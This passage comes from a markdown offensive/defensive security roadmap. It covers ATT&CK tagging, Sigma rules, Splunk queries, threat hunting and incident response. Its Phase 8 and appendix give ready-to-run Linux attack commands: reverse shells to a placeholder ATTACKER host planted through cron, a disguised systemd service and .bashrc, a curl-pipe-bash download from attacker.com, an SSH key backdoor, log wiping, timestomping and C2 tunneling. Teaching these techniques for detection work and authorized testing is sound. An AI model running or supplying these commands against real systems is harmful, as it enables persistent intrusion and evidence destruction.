Persistence    → T1053 (Scheduled Task/Cron), T1547 (Boot Autostart)
Priv Esc       → T1548 (Abuse Elevation Control), T1055 (Process Injection)
Defense Evasion → T1036 (Masquerading), T1070 (Indicator Removal)
Cred Access    → T1003 (OS Credential Dumping), T1110 (Brute Force)
Lateral Move   → T1021 (Remote Services: SSH/WinRM), T1550 (Pass-the-Hash)
Exfiltration   → T1041 (Exfil over C2), T1048 (Exfil over Alt Protocol)
```

**When you detect an event, tag it with ATT&CK ID. This is how SIEMs and reports are structured.**

### 7.4 Sigma Rules — Vendor-Agnostic Detection Rules

Sigma is to log detection what YARA is to file scanning. Sigma rules can be converted to Splunk, ELK, QRadar queries.

```yaml
title: SSH Brute Force Attempt
id: 5f6a8a9b-1234-4567-abcd-ef0123456789
status: production
description: Detects multiple failed SSH authentication attempts from a single source
references:
  - https://attack.mitre.org/techniques/T1110/
logsource:
  product: linux
  service: auth
detection:
  keywords:
    - 'Failed password'
  timeframe: 5m
  condition: keywords | count() by source > 10
falsepositives:
  - Legitimate users with typos
level: medium
tags:
  - attack.credential_access
  - attack.t1110.001
```

```bash
# Convert Sigma to Splunk SPL
sigma convert -t splunk -r rules/ssh_bruteforce.yml

# Convert to ELK/OpenSearch
sigma convert -t opensearch -r rules/ssh_bruteforce.yml
```

### 7.5 Splunk — SOC Analyst Core Queries

```spl
# Failed SSH logins
index=linux sourcetype=syslog "Failed password"
| stats count by src_ip, user | sort -count

# Successful login from new IP (baseline deviation)
index=linux sourcetype=syslog "Accepted password"
| stats count by src_ip
| where count < 3

# Process execution (auditd data)
index=linux sourcetype=auditd type=EXECVE
| table _time, pid, a0, a1, a2

# Web attack patterns
index=web sourcetype=apache_access
| rex "(?<status>\d{3})"
| where status=500 OR status=403
| stats count by clientip, uri | sort -count

# Network connection anomaly
index=network dest_port!=80 dest_port!=443 dest_port!=22
| stats count by src_ip, dest_ip, dest_port | sort -count
```

### 7.6 Threat Hunting Approach

Threat hunting is **proactive** — you're looking for threats that bypassed your defenses, before alerts fire.

```
Hunt Hypothesis Framework:
1. Define hypothesis: "An attacker may be using cron for persistence"
2. Identify data source: /var/spool/cron, /etc/crontab, auditd EXECVE
3. Query for anomalies: cron jobs pointing to /tmp, /dev/shm, unusual scripts
4. Investigate hits: triage each result
5. Document + create alert if real

Common Hunt Hypotheses:
→ "Attacker using known LOLBins for execution"
   Hunt: EXECVE records for base64, curl, python with -c flag, bash -i

→ "Persistence via new systemd service"
   Hunt: new .service files in /etc/systemd/, systemctl enable events

→ "Credential dumping from /etc/shadow"
   Hunt: reads of /etc/shadow by non-root processes

→ "Data staged in /tmp before exfil"
   Hunt: large files created in /tmp, followed by outbound curl/nc
```

### 7.7 Incident Response Workflow

```
Phase 1: Identification
  → Alert fires / anomaly detected
  → Triage: True positive or false positive?
  → Determine scope: single host, lateral spread?

Phase 2: Containment
  → Isolate affected host (disable NIC or VLAN change)
  → Block attacker IP at firewall
  sudo ufw insert 1 deny from ATTACKER_IP

Phase 3: Evidence Collection (before remediation)
  → Memory dump (do this FIRST — volatile evidence)
  sudo avml /tmp/mem.lime
  → Network connections snapshot
  ss -tunlp > /tmp/ir_netstat.txt
  → Running processes
  ps aux > /tmp/ir_processes.txt
  → Logged-in users
  who > /tmp/ir_users.txt && last >> /tmp/ir_users.txt
  → Crontab snapshot
  crontab -l -u root > /tmp/ir_cron.txt
  → Hash all system binaries (baseline comparison)
  find /usr/bin /usr/sbin -type f | xargs md5sum > /tmp/ir_hashes.txt

Phase 4: Eradication
  → Remove malware, backdoors, persistence mechanisms
  → Patch the exploited vulnerability

Phase 5: Recovery
  → Restore from clean snapshot / backup
  → Re-enable network
  → Monitor for re-infection

Phase 6: Lessons Learned
  → Write IR report
  → Update detection rules (Sigma/YARA)
  → Implement prevention
```

---

<a name="phase-8"></a>
## 👻 PHASE 8: PERSISTENCE, STEALTH & OPSEC
*Red Team leaves no traces. Blue Team hunts for exactly these.*

### 8.1 Persistence Mechanisms on Linux

```bash
# --- Cron ---
# Per-user cron (runs as that user)
echo "* * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1" | crontab -
# System-wide (visible to blue team — less stealthy)
echo "*/5 * * * * root /tmp/.hidden" >> /etc/crontab

# --- Systemd Service (persistent across reboots) ---
cat > /etc/systemd/system/update-checker.service << EOF
[Unit]
Description=System Update Checker
After=network.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
systemctl enable update-checker.service --now

# --- .bashrc / .profile injection ---
echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1 &' >> /home/user/.bashrc
# Triggers on every new bash session

# --- MOTD / Login scripts ---
echo 'curl http://attacker.com/payload | bash' >> /etc/update-motd.d/99-custom

# --- SSH authorized_keys (most stable persistence) ---
mkdir -p /root/.ssh && chmod 700 /root/.ssh
echo "ssh-ed25519 ATTACKER_PUBKEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

### 8.2 Stealth Techniques

```bash
# Clear evidence
history -c && history -w                  # clear bash history
echo "" > /var/log/auth.log               # clear auth log (requires root)
echo "" > ~/.bash_history

# Timestomping (match file timestamps to blend in)
touch -r /bin/ls /tmp/malware             # copy timestamp from legitimate file

# Hide files
# Files starting with . are hidden from ls
mv malware .update

# Use memory-only (no file on disk)
# Download and exec entirely in RAM
curl http://attacker.com/shell.sh | bash  # no file written

# Rename process to look legitimate
# In C: prctl(PR_SET_NAME, "kworker/0:1", 0, 0, 0)

# Use /dev/shm (tmpfs — wiped on reboot, no disk artifact)
cp malware /dev/shm/.kthread
/dev/shm/.kthread &
```

### 8.3 OPSEC — Operational Security

```bash
# Proxychains — chain your traffic through proxies
sudo apt install proxychains4
cat /etc/proxychains4.conf     # configure SOCKS5 proxies
proxychains nmap -sT target    # all traffic routed through chain

# Tor
sudo apt install tor
sudo systemctl start tor
# Add to proxychains config:  socks5 127.0.0.1 9050

# Traffic blending — disguise C2 as normal HTTPS
# Use domain fronting, CDNs (Cloudflare), HTTPS on port 443

# Avoid:
# - Using your real IP for anything
# - Reusing infrastructure
# - Unique tool signatures (customize your tools)
# - Operating at unusual hours (timezone correlation)

# DNS over HTTPS (bypass DNS monitoring)
# Configure systemd-resolved to use DoH provider
```

---

<a name="phase-9"></a>
## 🌌 PHASE 9: INFRASTRUCTURE & LAB SCALING
*Graduating from a single VM to an operator's infrastructure.*

### 9.1 Docker — Ephemeral Tooling

```bash
# Run Kali tools without installing them
docker pull kalilinux/kali-rolling
docker run -it kalilinux/kali-rolling /bin/bash

# Specific tool containers
docker run -it --rm securityresearcher/metasploit
docker run -it --rm owasp/zap zap.sh -daemon

# Create a custom pentest container
cat > Dockerfile << 'EOF'
FROM kalilinux/kali-rolling
RUN apt update && apt install -y nmap gobuster sqlmap hydra john
WORKDIR /workspace
CMD ["/bin/zsh"]
EOF
docker build -t my-pentest-box .
docker run -it -v $(pwd):/workspace my-pentest-box
```

### 9.2 SSH Tunneling & Pivoting

```bash
# Local port forward
# Access remote service (e.g., internal MySQL) on local port
ssh -L 3306:internal-db:3306 pivot_user@jump_host -N

# Remote port forward (Reverse tunnel — bypass firewall)
# From compromised host — exposes attacker's listener
ssh -R 8080:localhost:4444 attacker@C2_SERVER -N

# Dynamic SOCKS proxy (full network pivoting)
ssh -D 9050 pivot_user@jump_host -N
# Then configure proxychains to use SOCKS5 127.0.0.1:9050
proxychains nmap -sT internal_subnet

# Chisel (when SSH isn't available)
# On attacker server:   ./chisel server --port 9001 --reverse
# On victim:            ./chisel client ATTACKER:9001 R:socks
# Then: proxychains connects through victim to internal network
```

### 9.3 Terraform — Spin Up Attack Infrastructure

```hcl
# Provision a VPS for C2 / listener in seconds
provider "aws" {
  region = "ap-south-1"   # Mumbai
}

resource "aws_instance" "c2_server" {
  ami           = "ami-0a23ccb2cdd9286bb"   # Kali Linux AMI
  instance_type = "t2.micro"                 # free tier
  key_name      = "my-key"

  tags = {
    Name = "pentest-lab-node"
  }
}

output "c2_ip" {
  value = aws_instance.c2_server.public_ip
}
```

```bash
terraform init
terraform plan
terraform apply    # VPS spun up in ~30 seconds
terraform destroy  # clean up — leave no infrastructure behind
```

---

<a name="appendix"></a>
## 📜 APPENDIX: MASTER CHEAT SHEET

### Essential One-Liners by Category

**Recon:**
```bash
# Full TCP scan + service detection
nmap -sV -sC -p- -T4 --min-rate 5000 -oA full_scan TARGET

# Live host discovery
nmap -sn TARGET/24 --open | grep "report for" | awk '{print $5}'

# DNS zone transfer attempt
dig axfr @ns1.target.com target.com

# Shodan (from CLI)
shodan search "hostname:target.com" --fields ip_str,port,org
```

**Exploitation:**
```bash
# Most stable reverse shell (Python)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh","-i"])'

# Shell upgrade (after catching a bare reverse shell)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm

# Bash TCP reverse shell
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
```

**Post-Exploitation:**
```bash
# Find credentials fast
grep -rn "password\|passwd\|secret" /home /var/www /opt 2>/dev/null
find / -name "*.env" -o -name "config.php" -o -name "wp-config.php" 2>/dev/null

# Network pivot recon
for subnet in 10.10.10 192.168.1 172.16.0; do
  for h in $(seq 1 254); do
    ping -c1 -W1 $subnet.$h &>/dev/null && echo "[+] $subnet.$h UP"
  done
done
```

**Blue Team:**
```bash
# Top attackers in auth.log
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head

# Unusual SUID binaries (compare to known good)
find / -perm -4000 2>/dev/null | grep -vFf /tmp/known_suid.txt

# Files modified in last 24 hours
find / -mtime -1 -type f 2>/dev/null | grep -v proc
```

### Tool Reference Table

| Tool | Category | Primary Use |
|:---|:---|:---|
| **Nmap** | Recon | Port scan, service detection, NSE scripts |
| **Gobuster/Feroxbuster** | Web Recon | Directory/file brute-force |
| **SQLmap** | Web Exploit | Automated SQL injection |
| **Burp Suite** | Web Proxy | HTTP intercept, manipulation, scanning |
| **Metasploit** | Exploit Framework | Payload delivery, post-exploitation |
| **Impacket** | AD Attacks | SMB, Kerberoast, DCSync, PtH |
| **BloodHound** | AD Mapping | Attack path visualization |
| **CrackMapExec** | AD Lateral Move | SMB spray, remote execution |
| **Volatility 3** | Memory Forensics | RAM analysis, malware detection |
| **Ghidra** | Reverse Engineering | Disassembly + decompilation |
| **Wireshark/tcpdump** | Traffic Analysis | Packet capture and analysis |
| **Sigma** | Detection Rules | Vendor-agnostic log detection |
| **YARA** | Malware Hunting | File-based signature matching |
| **LinPEAS** | Priv Esc | Linux enumeration automation |
| **Proxychains** | OPSEC | Traffic routing through proxies |
| **Chisel** | Pivoting | Tunnel through HTTP/HTTPS |
| **Evil-WinRM** | AD Remote Access | PowerShell over WinRM |
| **Subfinder/Amass** | Bug Bounty Recon | Subdomain enumeration |

### Port Quick Reference

| Port | Protocol | Attack Relevance |
|:---|:---|:---|
| 21 | FTP | Anonymous login, credential brute-force, bounce attacks |
| 22 | SSH | Brute force, key theft, tunneling |
| 23 | Telnet | Cleartext credentials, MITM |
| 25 | SMTP | Open relay, phishing infrastructure |
| 53 | DNS | Zone transfer, DNS exfiltration, cache poisoning |
| 80/443 | HTTP/HTTPS | Web attacks, all OWASP Top 10 |
| 139/445 | SMB | EternalBlue, Pass-the-Hash, credential relay |
| 389/636 | LDAP/LDAPS | AD enumeration, null bind |
| 1433 | MSSQL | Credential brute-force, xp_cmdshell |
| 3306 | MySQL | SQLi target, direct credential attack |
| 3389 | RDP | BlueKeep, credential spray, lateral move |
| 5985/5986 | WinRM | Evil-WinRM, remote PS execution |
| 8080/8443 | Alt HTTP | Dev servers, admin panels, internal apps |

---

> **⚡ Remember: The best hackers understand both sides of the wire.**
> Red Team techniques become worthless the moment a Blue Team analyst knows to look for them.
> Study the attack to understand the defense. Study the defense to sharpen the attack.

---
*Resource compiled for educational and authorized security testing purposes only.*
